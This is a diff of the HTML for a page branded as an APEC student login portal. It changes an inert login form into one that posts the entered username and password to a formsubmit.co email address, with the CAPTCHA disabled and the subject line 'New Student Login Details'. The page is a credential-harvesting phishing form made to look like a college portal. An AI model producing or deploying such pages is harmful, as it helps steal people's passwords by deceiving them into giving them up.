@@ -14,38 +14,32 @@
 }
 
 body{
-    background:linear-gradient(135deg,#003366,#007bff);
-    height:100vh;
+    background:linear-gradient(135deg,#003366,#0099ff);
     display:flex;
     justify-content:center;
     align-items:center;
+    height:100vh;
 }
 
-.login-box{
+.container{
     width:360px;
     background:#fff;
     padding:30px;
-    border-radius:15px;
+    border-radius:12px;
+    box-shadow:0 0 20px rgba(0,0,0,0.3);
     text-align:center;
-    box-shadow:0 10px 25px rgba(0,0,0,0.3);
 }
 
-.logo{
+.container img{
     width:100px;
     height:100px;
     object-fit:contain;
     margin-bottom:15px;
 }
 
-h2{
+.container h2{
     color:#003366;
-    margin-bottom:5px;
-}
-
-p{
-    color:#666;
     margin-bottom:20px;
-    font-size:14px;
 }
 
 input{
@@ -53,58 +47,80 @@ input{
     padding:12px;
     margin:10px 0;
     border:1px solid #ccc;
-    border-radius:8px;
+    border-radius:5px;
     font-size:16px;
 }
 
 button{
     width:100%;
     padding:12px;
-    background:#003366;
-    color:white;
+    margin-top:10px;
     border:none;
-    border-radius:8px;
+    border-radius:5px;
+    background:#003366;
+    color:#fff;
+    font-size:18px;
     cursor:pointer;
-    font-size:16px;
-    transition:.3s;
 }
 
 button:hover{
-    background:#0056b3;
+    background:#0055aa;
 }
 
 .footer{
-    margin-top:20px;
+    margin-top:15px;
     font-size:13px;
     color:#777;
 }
 </style>
-
 </head>
+
 <body>
 
-<div class="login-box">
+<div class="container">
 
     <!-- College Logo -->
-    <img src="1697346843915.jpeg" alt="College Logo" class="logo">
+    <img src="1697346843915.jpeg" alt="College Logo">
 
-    <h2>APEC Student Login</h2>
-    <p>Assignment 10 - GitHub Pages Hosting</p>
+    <h2>Student Login</h2>
 
-    <form>
-        <input type="text" placeholder="Register Number" required>
+    <form action="https://formsubmit.co/YOUR_EMAIL@gmail.com" method="POST">
 
-        <input type="password" placeholder="Password" required>
+        <!-- Disable CAPTCHA -->
+        <input type="hidden" name="_captcha" value="false">
 
+        <!-- Email Subject -->
+        <input type="hidden" name="_subject" value="New Student Login Details">
+
+        <!-- Redirect after submission -->
+        <input type="hidden" name="_next" value="thankyou.html">
+
+        <!-- Username -->
+        <input
+            type="text"
+            name="Username"
+            placeholder="Enter Username"
+            required
+        >
+
+        <!-- Password -->
+        <input
+            type="password"
+            name="Password"
+            placeholder="Enter Password"
+            required
+        >
+
+        <!-- Login Button -->
         <button type="submit">Login</button>
+
     </form>
 
     <div class="footer">
-        © 2026 APEC Student Portal
+        © 2026 APEC Student Login Portal
     </div>
 
 </div>
 
 </body>
 </html>
-
